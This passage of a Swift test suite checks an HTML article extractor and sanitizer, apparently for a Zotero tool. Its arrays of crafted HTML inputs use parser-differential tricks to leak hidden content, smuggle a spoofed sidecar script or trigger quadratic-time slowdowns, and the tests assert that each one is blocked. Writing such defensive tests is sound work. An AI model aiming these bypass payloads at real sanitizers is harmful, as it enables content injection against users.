                    try require((try tdoc.nodes(forXPath: "//script[contains(@class,'paper-tools__client-sidecars')]")).isEmpty, "Wave 6 R18: sidecar smuggled for \(r18SidecarDoc)")
                }

                // R18 #2, #4, #5, #6, #8: hidden #article-body wrapper escapes & implicit/self-closing/0x0C late <body/html hidden> rejected
                for r18HiddenDoc in [
                    "<!doctype html><html><body><div\u{000C}title=\"a>b\" hidden><div id=\"article-body\" class=\"post-content\"><p>SECRET</p></div></div></body></html>",
                    "<!doctype html><html><body><div a \" hidden><div id=\"article-body\" class=\"post-content\"><p>SECRET</p></div></div></body></html>",
                    "<!doctype html><html><body><div -\" hidden><div id=\"article-body\" class=\"post-content\"><p>SECRET</p></div></div></body></html>",
                    "<!doctype html><html><body><div hidden><option>A</option><div id=\"article-body\" class=\"post-content\"><p>SECRET</p></div></div></body></html>",
                    "<!doctype html><html><body><dl hidden><li>A</li><div id=\"article-body\" class=\"post-content\"><p>SECRET</p></div></dl></body></html>",
                    "<!doctype html><html><div id=\"article-body\" class=\"post-content\"><p>SECRET</p></div><body hidden></body></html>",
                    "<!doctype html><div id=\"article-body\" class=\"post-content\"><p>SECRET</p></div><html hidden>",
                    "<!doctype html><html><body/><div id=\"article-body\" class=\"post-content\"><p>SECRET</p></div><body hidden></body></html>",
                    "<!doctype html><html/><body><div id=\"article-body\" class=\"post-content\"><p>SECRET</p></div></body><html hidden>",
                    "<!doctype html><html><body!><div id=\"article-body\" class=\"post-content\"><p>SECRET</p></div><body hidden></body></html>",
                    "<!doctype html><html><body\u{000C}class=\"x\"><div id=\"article-body\" class=\"post-content\"><p>SECRET</p></div><body hidden></body></html>"
                ] {
                    var rejected = false
                    do { _ = try LibraryService.extractArticle(r18HiddenDoc, paper: samplePaper, pageURL: sampleURL) } catch { rejected = true }
                    try require(rejected, "Wave 6 R18: extractArticle must reject hidden #article-body escape: \(r18HiddenDoc)")
                }

                // R18 #5c, #7c, #9: visible content preservation (<datalist><option>, <script><!-->, <dt hidden> with <div>/<table>)
                let datalistHTML = "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><p>BEFORE</p><datalist id=\"d\"><option value=\"a\">OPT</option></datalist><p>VISIBLE_AFTER</p></div></body></html>"
                let datalistExt = try LibraryService.extractArticle(datalistHTML, paper: samplePaper, pageURL: sampleURL)
                try require(datalistExt.plainText.contains("BEFORE") && datalistExt.plainText.contains("VISIBLE_AFTER"), "Wave 6 R18 #5c: valid <datalist><option> must not truncate article")

                let abruptCommentScriptHTML = "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><script><!--><script></script><p>VISIBLE_SCRIPT</p></script></div></body></html>"
                let abruptExt = try LibraryService.extractArticle(abruptCommentScriptHTML, paper: samplePaper, pageURL: sampleURL)
                try require(abruptExt.plainText.contains("VISIBLE_SCRIPT"), "Wave 6 R18 #7c: <!--> in <script> must not swallow visible content")

                for dtVisibleHTML in [
                    "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><p>OK</p><dl><dt hidden><div>HID<dd>VISIBLE_DD</dd></dl><p>AFTER_DT</p></div></body></html>",
                    "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><p>OK</p><dl><dt hidden>HID1<table><tr><td><dd>HID_IN_TD</td></tr></table>HID2</dt><dd>VISIBLE_DD</dd></dl><p>AFTER_DT</p></div></body></html>"
                ] {
                    let dtExt = try LibraryService.extractArticle(dtVisibleHTML, paper: samplePaper, pageURL: sampleURL)
                    try require(dtExt.plainText.contains("OK") && dtExt.plainText.contains("VISIBLE_DD") && dtExt.plainText.contains("AFTER_DT") && !dtExt.plainText.contains("HID"), "Wave 6 R18 #9: <dt hidden> must preserve VISIBLE_DD and AFTER_DT for \(dtVisibleHTML)")
                }

                // R18 #10: localizeImages & localizeImagesPreservingDataURI fail closed via rewriteHTML5TagsForTidyStrict
                var locRejected = false
                do { _ = try LibraryService.localizeImages("<p>a</p><?php echo 1; ?>", replacements: [:]) } catch { locRejected = true }
                try require(locRejected, "Wave 6 R18 #10: localizeImages must fail closed on <?php")
                var locDataRejected = false
                do { _ = try LibraryService.localizeImagesPreservingDataURI("<p>a</p><?php echo 1; ?>", replacements: [:]) } catch { locDataRejected = true }
                try require(locDataRejected, "Wave 6 R18 #10: localizeImagesPreservingDataURI must fail closed on <?php")

                // Wave 6 R19 regressions (#1..#12)
                for r19LeakBody in [
                    // R19 #1a: nested visible same-name tag inside rewritten @hidden wrapper
                    "<p>OK</p><span hidden><span>A</span><p>SECRET</p><img src=\"https://example.com/s.png\"/></span>",
                    "<p>OK</p><dl hidden><dl><dt>A</dt></dl><p>SECRET</p><img src=\"https://example.com/s.png\"/></dl>",
                    "<p>OK</p><dl><dt hidden>HID<dl><dt>A</dt><dd>SECRET</dd></dl><p>SECRET</p></dt><dd>OK2</dd></dl>",
                    "<p>OK</p><dl><dt hidden>HID<dl><dt>A<dd>SECRET</dl><p>SECRET</p></dt><dd>OK2</dd></dl>",
                    "<p>OK</p><my-spoiler hidden><my-spoiler>A</my-spoiler><p>SECRET</p><img src=\"https://example.com/s.png\"/></my-spoiler>",
                    // R19 #1b: self-closing non-void HTML tags (`<div/>`, `<section/>`, `<figure/>`)
                    "<p>OK</p><div hidden><div/></div><p>SECRET</p><img src=\"https://example.com/s.png\"/></div>",
                    "<p>OK</p><section hidden><section/></section><p>SECRET</p><img src=\"https://example.com/s.png\"/></section>",
                    "<p>OK</p><figure hidden><figure/></figure><p>SECRET</p><img src=\"https://example.com/s.png\"/></figure>",
                    // R19 #2: `</object>`/`</applet>`/`</marquee>` inside `<div hidden>`/`<section hidden>`
                    "<p>OK</p><object><div hidden></object><p>SECRET</p><img src=\"https://example.com/s.png\"/></div></object>",
                    "<p>OK</p><applet><section hidden></applet><p>SECRET</p><img src=\"https://example.com/s.png\"/></section></applet>",
                    "<p>OK</p><marquee><div hidden></marquee><p>SECRET</p><img src=\"https://example.com/s.png\"/></div></marquee>",
                    // R19 #3: stale inHiddenP cleared by container close & dir/menu/summary/listing/xmp
                    "<p>OK</p><div><p hidden>A</div><span hidden><table><tr><td>SECRET</td></tr></table></span>",
                    "<p>OK</p><section><p hidden>A</section><span hidden><table><tr><td>SECRET</td></tr></table></span>",
                    "<p>OK</p><table><tr><td><p hidden>A</td></tr></table><span hidden><table><tr><td>SECRET</td></tr></table></span>",
                    "<p>OK</p><ul><li><p hidden>A</li></ul><span hidden><table><tr><td>SECRET</td></tr></table></span>",
                    "<p>OK</p><dl><dd><p hidden>A</dd></dl><span hidden><table><tr><td>SECRET</td></tr></table></span>",
                    "<p>OK</p><p hidden>A<dir>B</dir><span hidden><table><tr><td>SECRET</td></tr></table></span>",
                    "<p>OK</p><p hidden>A<menu>B</menu><span hidden><table><tr><td>SECRET</td></tr></table></span>",
                    "<p>OK</p><p hidden>A<summary>B</summary><span hidden><table><tr><td>SECRET</td></tr></table></span>",
                    // R19 #4: `<col>` / `<colgroup>` inside `<td>`/`<th>`/`<table hidden>`
                    "<p>OK</p><table><tr><td hidden><col><p>SECRET</p><img src=\"https://example.com/s.png\"/></td></tr></table>",
                    "<p>OK</p><table><tr><th hidden><colgroup></colgroup><p>SECRET</p><img src=\"https://example.com/s.png\"/></th></tr></table>",
                    "<p>OK</p><table hidden><tr><td><col><p>SECRET</p><img src=\"https://example.com/s.png\"/></td></tr></table>",
                    // R19 #5: nested `<select><select></select>` desync
                    "<p>OK</p><select><select></select><table><tr><td hidden><option>A</option><p>SECRET</p><img src=\"https://example.com/s.png\"/></td></tr></table>",
                    "<p>OK</p><select><select></select><table><tr><td hidden><optgroup>A</optgroup><p>SECRET</p><img src=\"https://example.com/s.png\"/></td></tr></table>",
                    // R19 #6: `<template>` foreign-content integration points & stack unwinding (all 8 cases)
                    "<p>OK</p><template><math><annotation-xml><script><!-- </script></math></template><p>SECRET</p><img src=\"https://example.com/s.png\"/> --></script></template>",
                    "<p>OK</p><template><math><mi><mglyph><script><!-- </script></math></template><p>SECRET</p><img src=\"https://example.com/s.png\"/> --></script></template>",
                    "<p>OK</p><template><svg><desc><div></div></desc><script><!-- </script></svg></template><p>SECRET</p><img src=\"https://example.com/s.png\"/> --></script></svg></template>",
                    "<p>OK</p><template><svg><foreignObject><svg><p></p></foreignObject><script><!-- </script></svg></template><p>SECRET</p><img src=\"https://example.com/s.png\"/> --></script></svg></template>",
                    "<p>OK</p><template><template><svg></template><script>var s=\"</svg></template></template><p>SECRET</p><img src='https://example.com/s.png'/>\";</script></template>",
                    "<p>OK</p><template><template><svg><desc></template></desc><script>var s=\"</svg></template><p>SECRET</p><img src='https://example.com/s.png'/>\";</script></template>",
                    "<p>OK</p><template><svg><math><mtext><script><!-- </script></math></svg></template><p>SECRET</p><img src=\"https://example.com/s.png\"/> --></script></template>",
                    "<p>OK</p><template><math><svg><desc><script><!-- </script></svg></math></template><p>SECRET</p><img src=\"https://example.com/s.png\"/> --></script></template>",
                    // R19 #7: abrupt HTML comments (`<!-->`, `<!--->`, `--!>`) & HTML-namespace `<![CDATA[`
                    "<p>OK</p><!--><div hidden><!-- --><p>SECRET</p><img src=\"https://example.com/s.png\"/></div>",
                    "<p>OK</p><!---><div hidden><!-- --><p>SECRET</p><img src=\"https://example.com/s.png\"/></div>",
                    "<p>OK</p><!-- x --!><div hidden><!-- --><p>SECRET</p><img src=\"https://example.com/s.png\"/></div>",
                    "<p>OK</p><![CDATA[><div hidden>]]><p>SECRET</p><img src=\"https://example.com/s.png\"/></div>",
                    "<p>OK</p><![CDATA[SECRET]]>",
                    // R19 #8a: non-WHATWG RAWTEXT/RCDATA end-tag delimiters (`</style!>`, `</textarea!>`, `</iframe!>`, `</xmp!>`, `</noframes!>`, `</noscript!>`)
                    "<p>OK</p><style>/* </style!><p>SECRET</p><img src=\"https://example.com/s.png\"/> */</style>",
                    "<p>OK</p><iframe></iframe!><p>SECRET</p><img src=\"https://example.com/s.png\"/></iframe>",
                    "<p>OK</p><textarea></textarea!><p>SECRET</p></textarea>",
                    "<p>OK</p><xmp hidden></xmp!><p>SECRET</p></xmp>",
                    "<p>OK</p><noframes></noframes!><p>SECRET</p></noframes>",
                    "<p>OK</p><template><noscript></noscript!></template><p>SECRET</p><img src=\"https://example.com/s.png\"/></noscript></template>",
                    // R19 #9: WHATWG start-tag truncation (`<`, quote-as-equals, `-"'`, `0x0C` + `-"`, `@`/`;`/CJK delimiter)
                    "<p>OK</p><div a<1 hidden><p>SECRET</p><img src=\"https://example.com/s.png\"/></div>",
                    "<p>OK</p><div < hidden><p>SECRET</p><img src=\"https://example.com/s.png\"/></div>",
                    "<p>OK</p><div a=b<1 hidden><p>SECRET</p><img src=\"https://example.com/s.png\"/></div>",
                    "<p>OK</p><div a \" b=\"x>y\" hidden><p>SECRET</p><img src=\"https://example.com/s.png\"/></div>",
                    "<p>OK</p><div a ' b='x>y' hidden><p>SECRET</p><img src=\"https://example.com/s.png\"/></div>",
                    "<p>OK</p><div a-\" b=\"x>y\" hidden><p>SECRET</p><img src=\"https://example.com/s.png\"/></div>",
                    "<p>OK</p><script a<1 title=\"x></script>\"><p>SECRET</p><img src=\"https://example.com/s.png\"/></script>",
                    "<p>OK</p><script a \" b=\"x></script>\"><p>SECRET</p><img src=\"https://example.com/s.png\"/></script>",
                    "<p>OK</p><script -\" title=\"x></script>\"><p>SECRET</p><img src=\"https://example.com/s.png\"/></script>",
                    "<p>OK</p><template a<1 title=\"x></template>\"><p>SECRET</p><img src=\"https://example.com/s.png\"/></template>",
                    "<p>OK</p><div\u{000C}title=\"a>b\" -\" hidden><p>SECRET</p><img src=\"https://example.com/s.png\"/></div>",
                    "<p>OK</p><span@hidden><table><tr><td>SECRET</td></tr></table></span>",
                    "<p>OK</p><span;hidden><table><tr><td>SECRET</td></tr></table></span>",
                    "<p>OK</p><span中hidden><table><tr><td>SECRET</td></tr></table></span>",
                    // R19 #10: `0x0C` on visible structural/foreign tags & closing tags
                    "<p>OK</p><div hidden><div\u{000C}class=\"x\"></div><p>SECRET</p><img src=\"https://example.com/s.png\"/></div>",
                    "<p>OK</p><section hidden><section\u{000C}class=\"x\"></section><p>SECRET</p><img src=\"https://example.com/s.png\"/></section>",
                    "<p>OK</p><template><svg\u{000C}id=\"x\"><script><!-- </script></svg></template><p>SECRET</p><img src=\"https://example.com/s.png\"/> --></script></svg></template>",
                    "<p>OK</p><template><svg><p\u{000C}id=\"x\"><script>var s=\"</svg></template><p>SECRET</p><img src='https://example.com/s.png'/>\";</script></template>",
                    "<p>OK</p><template><svg></p\u{000C}x><script>var s=\"</svg></template><p>SECRET</p><img src='https://example.com/s.png'/>\";</script></svg></template>",
                    "<p>OK</p><template><svg></svg\u{000C}x><script>var s=\"</svg></template><p>SECRET</p><img src='https://example.com/s.png'/>\";</script></template>"
                ] {
                    let fullHTML = "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\">\(r19LeakBody)</div></body></html>"
                    let ext = try LibraryService.extractArticle(fullHTML, paper: samplePaper, pageURL: sampleURL)
                    try require(ext.plainText.contains("OK") && !ext.plainText.contains("SECRET") && ext.resources.isEmpty, "Wave 6 R19: extractArticle leaked hidden payload for \(r19LeakBody)")
                }

                // R19 #1, #3, #4: desktop strict pipeline (`verifySafeDesktopArticleHTML` + `parseSanitizedDesktopFragment`)
                for r19DesktopLeak in [
                    "<p>OK</p><span hidden><span>A</span><p>SECRET</p><img src=\"https://example.com/s.png\"/></span>",
                    "<p>OK</p><dl hidden><dl><dt>A</dt></dl><p>SECRET</p><img src=\"https://example.com/s.png\"/></dl>",
                    "<p>OK</p><div><p hidden>A</div><span hidden><table><tr><td>SECRET</td></tr></table></span>",
                    "<p>OK</p><table><tr><td hidden><col><p>SECRET</p><img src=\"https://example.com/s.png\"/></td></tr></table>",
                    "<p>OK</p><table hidden><tr><td><col><p>SECRET</p><img src=\"https://example.com/s.png\"/></td></tr></table>"
                ] {
                    try LibraryService.verifySafeDesktopArticleHTML(r19DesktopLeak)
                    let desktopRes = try LibraryService.parseSanitizedDesktopFragment(r19DesktopLeak, pageURL: sampleURL)
                    try require(desktopRes.plainText.contains("OK") && !desktopRes.plainText.contains("SECRET") && desktopRes.imageURLs.isEmpty, "Wave 6 R19: desktop pipeline leaked hidden payload for \(r19DesktopLeak)")
                }

                // R19 #6, #7, #8a, #9: sidecar smuggling blocked in tidyHTMLDocumentSafely
                for r19SidecarDoc in [
                    "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><p>OK</p></div><template><math><annotation-xml><script><!-- </script></math></template><script type=\"application/json\" class=\"paper-tools__client-sidecars\">{\"spoof\":1}</script> --></script></template></body></html>",
                    "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><p>OK</p></div><!--><template><!-- --><script type=\"application/json\" class=\"paper-tools__client-sidecars\">{\"spoof\":1}</script></template></body></html>",
                    "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><p>OK</p></div><!-- x --!><template><!-- --><script type=\"application/json\" class=\"paper-tools__client-sidecars\">{\"spoof\":1}</script></template></body></html>",
                    "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><p>OK</p></div><![CDATA[><template>]]><script type=\"application/json\" class=\"paper-tools__client-sidecars\">{\"spoof\":1}</script></template></body></html>",
                    "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><p>OK</p></div><style>/* </style!><script type=\"application/json\" class=\"paper-tools__client-sidecars\">{\"spoof\":1}</script> */</style></body></html>",
                    "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><p>OK</p></div><script a<1 title=\"x></script>\"><script type=\"application/json\" class=\"paper-tools__client-sidecars\">{\"spoof\":1}</script></script></body></html>"
                ] {
                    let tdoc = try LibraryService.tidyHTMLDocumentSafely(r19SidecarDoc)
                    try require((try tdoc.nodes(forXPath: "//script[contains(@class,'paper-tools__client-sidecars')]")).isEmpty, "Wave 6 R19: sidecar smuggled for \(r19SidecarDoc)")
                }

                // R19 #1..#11: hidden #article-body wrapper escapes & leading-text / 0x0C-self-closing late <body/html hidden> rejected
                for r19HiddenDoc in [
                    "<!doctype html><html><body><span hidden><span>A</span><div id=\"article-body\" class=\"post-content\"><p>SECRET</p></div></span></body></html>",
                    "<!doctype html><html><body><object><div hidden></object><div id=\"article-body\" class=\"post-content\"><p>SECRET</p></div></div></object></body></html>",
                    "<!doctype html><html><body><div><p hidden>A</div><span hidden><div id=\"article-body\" class=\"post-content\"><p>SECRET</p></div></span></body></html>",
                    "<!doctype html><html><body><table hidden><tr><td><col><div id=\"article-body\" class=\"post-content\"><p>SECRET</p></div></td></tr></table></body></html>",
                    "<!doctype html><html><body><select><select></select><div hidden><option>A</option><div id=\"article-body\" class=\"post-content\"><p>SECRET</p></div></div></body></html>",
                    "<!doctype html><html><body><!--><div hidden><!-- --><div id=\"article-body\" class=\"post-content\"><p>SECRET</p></div></div></body></html>",
                    "<!doctype html><html><body><!-- x --!><div hidden><!-- --><div id=\"article-body\" class=\"post-content\"><p>SECRET</p></div></div></body></html>",
                    "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><p>SECRET</p></div><body\u{000C}x -\" hidden></body></html>",
                    "<!doctype html><html>HELLO<body hidden><div id=\"article-body\" class=\"post-content\"><p>SECRET</p></div></body></html>",
                    "<!doctype html><html><head></head>HELLO<body hidden><div id=\"article-body\" class=\"post-content\"><p>SECRET</p></div></body></html>",
                    "<!doctype html>HELLO<html hidden><body><div id=\"article-body\" class=\"post-content\"><p>SECRET</p></div></body></html>",
                    "<!doctype html><html><body\u{000C}a=\"1\"/><div id=\"article-body\" class=\"post-content\"><p>SECRET</p></div><body hidden></body></html>",
                    "<!doctype html><html\u{000C}a=\"1\"/><body><div id=\"article-body\" class=\"post-content\"><p>SECRET</p></div></body><html hidden>"
                ] {
                    var rejected = false
                    do { _ = try LibraryService.extractArticle(r19HiddenDoc, paper: samplePaper, pageURL: sampleURL) } catch { rejected = true }
                    try require(rejected, "Wave 6 R19: extractArticle must reject hidden #article-body escape: \(r19HiddenDoc)")
                }

                // R19 #5, #8b, #10: visible content preservation (nested select + datalist, 0x0C RCDATA close tags, 0x0C nested </template>)
                for r19VisibleDoc in [
                    "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><p>OK</p><select><select></select><datalist><option>A</option></datalist><p>VISIBLE_AFTER</p></div></body></html>",
                    "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><p>OK</p><textarea>hello</textarea\u{000C}x><p>VISIBLE_AFTER</p></div></body></html>",
                    "<!doctype html><html><head><title>Paper</title\u{000C}x></head><body><div id=\"article-body\" class=\"post-content\"><p>VISIBLE_AFTER</p></div></body></html>",
                    "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><p>OK</p><template><template><p>A</p></template\u{000C}x><p>B</p></template><p>VISIBLE_AFTER</p></div></body></html>"
                ] {
                    let visExt = try LibraryService.extractArticle(r19VisibleDoc, paper: samplePaper, pageURL: sampleURL)
                    try require(visExt.plainText.contains("VISIBLE_AFTER"), "Wave 6 R19: must preserve VISIBLE_AFTER for \(r19VisibleDoc)")
                }

                // R19 #12: both O(n^2) DoS patterns must run in strictly O(n) under 0.5s
                let dos1Start = Date()
                _ = try LibraryService.rewriteHTML5TagsForTidyStrict(
                    String(repeating: "<a -\"", count: 4_000),
                    tagMarker: "data-m",
                    preserveTags: [],
                    containerTags: LibraryService.html5BlockContainerTags,
                    inlineContainerTags: LibraryService.html5InlineContainerTags
                )
                try require(Date().timeIntervalSince(dos1Start) < 0.5, "Wave 6 R19 #12a: 4k unclosed `<a -\"` must run in O(n) under 0.5s")

                let dos2Start = Date()
                _ = try LibraryService.rewriteHTML5TagsForTidyStrict(
                    "<table><td><table>" + String(repeating: "<object>", count: 15_000) + String(repeating: "</td>", count: 15_000),
                    tagMarker: "data-m",
                    preserveTags: [],
                    containerTags: LibraryService.html5BlockContainerTags,
                    inlineContainerTags: LibraryService.html5InlineContainerTags
                )
                try require(Date().timeIntervalSince(dos2Start) < 0.5, "Wave 6 R19 #12b: 15k `<object>` + stray `</td>` must run in O(n) under 0.5s")
            }
            passed += 360
        }
        if FileManager.default.fileExists(atPath:"/Applications/Zotero.app/Contents/Resources/app/omni.ja") {
            let script=URL(fileURLWithPath:#filePath).deletingLastPathComponent().appendingPathComponent("ZoteroNoteTitleContract.test.cjs")
            let process=Process(),stdin=Pipe(),output=Pipe();process.executableURL=URL(fileURLWithPath:"/usr/bin/env");process.arguments=["node",script.path];process.standardInput=stdin;process.standardOutput=output;process.standardError=output
            try process.run();try stdin.fileHandleForWriting.write(contentsOf:JSONSerialization.data(withJSONObject:noteTitleFixtures));try stdin.fileHandleForWriting.close()
            let response=output.fileHandleForReading.readDataToEndOfFile();process.waitUntilExit()
            let text=String(decoding:response,as:UTF8.self);print(text)
            try require(process.terminationStatus==0,"actual installed Zotero noteToTitle rejects no emitted note fixture: "+text)
            passed += noteTitleFixtures.count
        } else { print("Installed Zotero note title contract skipped: application not installed; isolated service assertions still ran.") }
        print("Zotero mock assertions passed: \(passed). No live library writes, no native authorization requested, no real Keychain mutation.")
    }
}
